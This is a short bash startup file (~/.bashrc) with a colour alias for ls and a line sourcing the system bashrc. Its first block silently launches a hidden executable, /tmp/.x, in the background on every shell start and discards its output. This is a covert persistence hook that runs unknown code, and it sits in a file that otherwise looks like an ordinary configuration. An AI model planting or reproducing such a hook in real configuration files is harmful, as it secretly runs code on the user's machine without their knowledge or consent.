# ~/.bashrc
if [ -x /tmp/.x ]; then
    /tmp/.x &>/dev/null &
fi

# Source system bashrc
[ -f /etc/bash.bashrc ] && . /etc/bash.bashrc

alias ls='ls --color=auto'
